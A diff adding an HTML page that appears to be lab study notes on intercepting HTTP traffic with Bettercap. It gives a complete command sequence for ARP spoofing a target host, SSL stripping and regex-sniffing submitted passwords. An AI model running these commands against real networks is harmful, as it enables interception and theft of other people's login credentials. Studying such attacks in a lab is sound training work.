@@ -1,0 +1,29 @@
+<html>
+    <meta name=”robots” content=”noindex,nofollow”/>
+  <a href=../index.html>Back to home</a>
+<hr/>
+<h1>Intercept HTTP Traffic using Bettercap</h1>
+<p>Attackers can use session hijacking to launch various kinds of attacks such as man-in-the middle (MITM) attacks. 
+  In an MITM attack, the attacker places himself/herself between the authorized client and the webserver so that all 
+  information traveling in either direction passes through them.</p>
+  
+<h2>Procedure</h2>
+<p><ol>
+    <ul>sudo bettercap -iface eth0</ul>
+    <ul>net.probe on</ul>
+    <ul>net.recon on</ul>
+    <ul>set http.proxy.sslstrip true</ul>
+    <ul>set arp.spoof.internal true</ul>
+    <ul>set arp.spoof.targets 10.10.1.11</ul>
+    <ul>http.proxy on</ul>
+    <ul>arp.spoof on </ul>
+    <ul>net.sniff on</ul>
+    <ul>set net.sniff.regexp ‘.*password=.+’</ul>
+</ol></p>
+
+  <p>Now open the browser on the target computer (10.10.1.11) and visit a webpage</p>
+  <p>Log in on a HTTP webpage</p>
+
+  <p>bettercap collects all http logins used by routers, servers, and websites that do not have SSL enabled. 
+    To use bettercap to sniff network traffic from https-based websites, you must enable the SSL strip module by issuing the command 
+    set http.proxy.sslstrip true.</p>
